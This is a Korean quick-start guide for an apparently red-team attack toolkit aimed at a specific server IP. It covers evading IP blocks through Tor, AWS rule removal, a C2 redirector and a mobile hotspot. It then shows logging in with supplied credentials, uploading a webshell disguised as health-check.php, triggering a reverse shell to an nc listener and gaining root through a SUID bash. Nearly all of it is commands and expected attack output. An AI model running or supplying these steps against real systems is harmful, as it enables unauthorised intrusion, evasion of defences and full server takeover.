# 빠른 시작 가이드

**3가지 방법으로 IP 차단 우회**

---

## 🚀 방법 1: Tor 사용 (가장 빠름)

### 1단계: Tor 설치 및 시작

```bash
# Tor 설치
brew install tor

# Tor 시작
brew services start tor

# 상태 확인
brew services list | grep tor
# tor started 확인
```

### 2단계: PySocks 설치

```bash
pip3 install PySocks requests[socks]
```

### 3단계: 스크립트 실행

```bash
cd /Users/hwangjunha/Desktop/Red_basic_local/H/2025-11-14/exploits

python3 01_detection_bypass_webshell.py
```

**입력 예시:**
```
타겟 IP 주소 입력: 43.201.154.142

프록시 설정:
1. Tor 사용 (127.0.0.1:9050)
2. 커스텀 SOCKS5 프록시
3. 커스텀 HTTP 프록시
4. 프록시 없음

선택 (1-4): 1
[+] Tor 프록시 설정 완료

C2 서버 주소 (선택, Enter 스킵): [Enter]
리다이렉터 서버 주소 (선택, Enter 스킵): [Enter]
오퍼레이터 서버 주소 (선택, Enter 스킵): [Enter]
```

**예상 출력:**
```
[+] 프록시 사용: {'http': 'socks5h://127.0.0.1:9050', ...}
[*] 로그인 시도: alice
[+] 로그인 성공!
[+] 웹쉘 생성: health-check.php
[+] 웹쉘 업로드 성공!
[+] 웹쉘 URL: http://43.201.154.142/uploads/health-check.php
```

---

## 🌐 방법 2: AWS 차단 해제

### 사전 요구사항
- AWS CLI 설치 및 설정
- EC2 인스턴스 ID
- SSH 키

### 1단계: AWS CLI 설정

```bash
# AWS CLI 설치 (macOS)
brew install awscli

# 설정
aws configure
# AWS Access Key ID: YOUR_KEY
# AWS Secret Access Key: YOUR_SECRET
# Default region: ap-northeast-2
```

### 2단계: 차단 해제 스크립트 실행

```bash
cd /Users/hwangjunha/Desktop/Red_basic_local/H/2025-11-14/exploits

./04_aws_unban_ip.sh
```

**입력 예시:**
```
EC2 인스턴스 ID: i-0123456789abcdef0
차단된 IP를 제거하시겠습니까? (y/N): y
제거할 IP 주소: 1.2.3.4
모든 트래픽 허용 규칙을 추가하시겠습니까? (y/N): y
SSH로 연결하여 서버 설정을 변경하시겠습니까? (y/N): y
SSH 키 파일 경로: ~/.ssh/mykey.pem
SSH 사용자: ec2-user
```

**스크립트가 자동으로:**
1. 보안 그룹에서 차단 규칙 제거
2. HTTP/HTTPS 허용 규칙 추가
3. SSH로 서버 접속
4. iptables 초기화
5. fail2ban 차단 해제

### 3단계: 스크립트 실행

```bash
python3 01_detection_bypass_webshell.py
# 타겟 IP: 43.201.154.142
# 프록시: 4 (없음)
```

---

## 🔧 방법 3: C2 + 리다이렉터 사용

### 아키텍처

```
로컬 머신 → [Tor] → 리다이렉터 (AWS EC2) → 타겟 서버
```

### 1단계: 리다이렉터 서버 생성 (AWS)

```bash
# EC2 인스턴스 생성
aws ec2 run-instances \
  --image-id ami-0c76973fbe0ee100c \
  --instance-type t2.micro \
  --key-name your-key \
  --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=Redirector}]'

# IP 확인
aws ec2 describe-instances \
  --filters "Name=tag:Name,Values=Redirector" \
  --query 'Reservations[0].Instances[0].PublicIpAddress' \
  --output text
```

### 2단계: Nginx 리버스 프록시 설정

```bash
# SSH 접속
ssh -i ~/.ssh/your-key.pem ec2-user@REDIRECTOR_IP

# Nginx 설치
sudo yum install -y nginx

# 설정 파일 생성
sudo tee /etc/nginx/nginx.conf > /dev/null <<'EOF'
events {
    worker_connections 1024;
}

http {
    server {
        listen 80;
        server_name _;

        location / {
            proxy_pass http://43.201.154.142;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_buffering off;
        }
    }
}
EOF

# Nginx 시작
sudo systemctl enable nginx
sudo systemctl start nginx
```

### 3단계: 스크립트 실행 (Tor + 리다이렉터)

```bash
# Tor 시작
brew services start tor

python3 01_detection_bypass_webshell.py
```

**입력:**
```
타겟 IP: REDIRECTOR_IP (리다이렉터 IP 입력!)
프록시: 1 (Tor)
리다이렉터 서버: REDIRECTOR_IP
```

**흐름:**
```
로컬 → Tor (IP 변경) → 리다이렉터 (트래픽 중계) → 타겟
```

---

## 📱 방법 4: 모바일 핫스팟 (가장 간단)

### 1단계: 핫스팟 켜기
1. 스마트폰 설정
2. 개인용 핫스팟 활성화

### 2단계: 연결
1. 맥북 Wi-Fi
2. 핫스팟 네트워크 선택

### 3단계: 스크립트 실행
```bash
python3 01_detection_bypass_webshell.py
# 타겟 IP: 43.201.154.142
# 프록시: 4 (없음)
```

---

## 🎯 리버스 쉘 & 권한 상승

### 웹쉘 업로드 성공 후

**터미널 1 (리스너):**
```bash
nc -lvnp 4444
```

**터미널 2 (공격):**
```bash
python3 02_reverse_shell_privesc.py
```

**입력:**
```
타겟 IP: 43.201.154.142
웹쉘 URL: http://43.201.154.142/uploads/health-check.php
공격자 IP: YOUR_IP (또는 127.0.0.1)
리스너 포트: 4444

작업 선택:
1. 리버스 쉘만 트리거
2. 권한 상승만 시도
3. 리버스 쉘 + 권한 상승 (전체 자동화)
4. 수동 권한 상승 가이드 보기

선택: 3
```

**예상 결과:**
```
[+] 트리거 완료: bash_tcp
[+] 트리거 완료: python3
[+] 현재 사용자: apache
[+] sudo 권한:
    (ALL) NOPASSWD: /bin/bash
[+] SUID bash 생성 성공!
[+] 루트 권한 획득 성공!

웹쉘로 루트 명령 실행:
  http://43.201.154.142/uploads/health-check.php?x=/tmp/rootbash -p -c 'whoami'
```

---

## 🐛 트러블슈팅

### Connection Timeout

**원인:** IP 차단됨

**해결:**
1. 방법 1 (Tor) 사용
2. 또는 방법 2 (AWS 차단 해제)

---

### Tor 연결 안 됨

**확인:**
```bash
# Tor 실행 중인지 확인
brew services list | grep tor

# 재시작
brew services restart tor

# SOCKS5 포트 확인
lsof -i :9050
```

---

### PySocks 오류

**해결:**
```bash
pip3 install --upgrade PySocks requests[socks]
```

---

### AWS 권한 부족

**해결:**
```bash
# IAM 권한 확인
aws iam get-user

# EC2 권한 필요:
# - ec2:DescribeInstances
# - ec2:AuthorizeSecurityGroupIngress
# - ec2:RevokeSecurityGroupIngress
```

---

## 📋 체크리스트

### 시작 전 확인

- [ ] Python 3.7+ 설치
- [ ] `pip3 install requests beautifulsoup4`
- [ ] 타겟 IP 확인
- [ ] 로그인 정보 확인 (alice/alice2024)

### Tor 사용 시

- [ ] `brew install tor`
- [ ] `brew services start tor`
- [ ] `pip3 install PySocks`

### AWS 사용 시

- [ ] AWS CLI 설치 및 설정
- [ ] EC2 인스턴스 ID 확인
- [ ] SSH 키 파일 준비

### C2/리다이렉터 사용 시

- [ ] AWS EC2 인스턴스 생성
- [ ] Nginx 설치 및 설정
- [ ] 보안 그룹 설정

---

## 🎓 추가 문서

- **README.md** - 전체 개요
- **docs/ATTACK_METHODOLOGY.md** - 상세 공격 방법론
- **docs/IP_UNBAN_GUIDE.md** - IP 차단 해제 가이드
- **docs/C2_REDIRECTOR_SETUP.md** - C2/리다이렉터 설정

---

**작성일:** 2025-11-14
**추천 방법:** Tor (가장 빠르고 간단)
